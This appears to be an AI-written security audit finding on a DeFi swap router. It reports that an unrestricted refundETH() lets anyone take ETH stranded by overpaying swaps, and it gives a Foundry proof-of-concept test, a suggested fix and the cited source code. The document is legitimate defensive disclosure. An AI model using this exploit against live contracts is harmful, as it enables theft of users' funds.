The full picture is now clear. Let me trace the exact execution path.

**`refundETH()` — no access control:** [1](#0-0) 

**`pay()` — wraps only `value` wei, not all ETH:** [2](#0-1) 

**`exactInputSingle` is `payable` and callable directly:** [3](#0-2) 

**The intended pattern (multicall + refundETH in same tx):** [4](#0-3) 

---

### Title
Unprivileged `refundETH()` drains stranded ETH left by any caller who sends excess `msg.value` to a payable swap function — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

### Summary

`refundETH()` is an unrestricted `external payable` function that transfers the router's entire native ETH balance to `msg.sender`. The `pay()` helper wraps only the exact `amountIn` worth of ETH when `tokenIn == WETH`, leaving any excess `msg.value` stranded on the router. Any third party can call `refundETH()` in a subsequent transaction to steal that stranded ETH.

### Finding Description

`PeripheryPayments.refundETH()` contains no caller check:

```solidity
function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
        _transferETH(msg.sender, balance);   // sends to whoever calls
    }
}
```

When a user calls `exactInputSingle{value: X}` with `amountIn = Y` where `X > Y` and `tokenIn == WETH`, the `pay()` callback executes:

```solidity
uint256 nativeBalance = address(this).balance;   // = X
if (nativeBalance >= value) {                    // X >= Y → true
    IWETH9(WETH).deposit{value: value}();        // wraps only Y
    IERC20(WETH).safeTransfer(recipient, value); // transfers Y WETH
}
// X - Y ETH remains on the router
```

The transaction completes successfully with `X − Y` ETH stranded on the router. The `receive()` guard (`if (msg.sender != WETH) revert NotWETH()`) only blocks plain ETH transfers; it does not prevent ETH from entering via `msg.value` on any `payable` function. In a subsequent transaction, any caller invokes `refundETH()` and receives the full stranded balance.

The intended safe pattern — `multicall{value: X}([exactInputSingle(...), refundETH()])` — bundles the refund atomically in the same transaction. But `exactInputSingle`, `exactInput`, `exactOutputSingle`, and `exactOutput` are all independently `payable`, so users can and do call them directly with excess ETH, creating the stranding condition without any atomically-bundled refund.

### Impact Explanation

Any ETH stranded on the router by a user who sends excess `msg.value` in a direct (non-multicall) swap call is immediately claimable by an unprivileged attacker. The attacker calls `refundETH()` in a separate transaction (or front-runs the victim's own refund call) and receives the full balance. The victim loses the excess ETH with no recourse.

### Likelihood Explanation

The router's own test suite demonstrates the exact stranding scenario (`test_multicall_ethInput_exactInputSingle_refundsUnusedEth`) and shows that the safe pattern requires the user to explicitly append `refundETH()` inside a multicall. Any user who calls a payable swap function directly with `msg.value > amountIn` — a natural mistake given that all swap entry points are `payable` — creates a stealable balance. Front-running bots monitoring the mempool can trivially detect and exploit this.

### Recommendation

Add a caller-binding check to `refundETH()` so it can only return ETH to the address that deposited it, or restrict it to be callable only from within a `multicall` context (e.g., via a transient reentrancy guard that records `msg.sender` at `multicall` entry). Alternatively, auto-refund excess ETH at the end of each payable swap function rather than relying on the caller to append a separate `refundETH()` step.

### Proof of Concept

```solidity
// Foundry test sketch
function test_crossTx_refundETH_stealsStrandedETH() public {
    address userA   = makeAddr("userA");
    address attacker = makeAddr("attacker");
    vm.deal(userA, 2 ether);

    // userA calls exactInputSingle directly with excess ETH
    vm.prank(userA);
    router.exactInputSingle{value: 2 ether}(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountIn: 1_000,          // only 1000 wei consumed
            amountOutMinimum: 0,
            recipient: userA,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );
    // 2 ether - 1000 wei is now stranded on the router

    uint256 before = attacker.balance;
    vm.prank(attacker);
    router.refundETH();               // no access control

    assertGt(attacker.balance, before, "attacker stole userA's ETH");
    assertEq(address(router).balance, 0);
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-78)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L106-133)
```text
  function test_multicall_ethInput_exactInputSingle_refundsUnusedEth() public {
    uint128 amountIn = 1_000;
    uint256 msgValue = 2 ether;
    uint256 swapperEthBefore = swapper.balance;

    vm.prank(swapper);
    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeWithSelector(
      router.exactInputSingle.selector,
      IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: recipient,
        deadline: _deadline(),
        priceLimitX64: 0,
        extensionData: ""
      })
    );
    calls[1] = abi.encodeWithSelector(router.refundETH.selector);
    router.multicall{value: msgValue}(calls);

    assertEq(swapper.balance, swapperEthBefore - amountIn, "unused eth refunded");
    _assertRouterEmpty();
  }
```
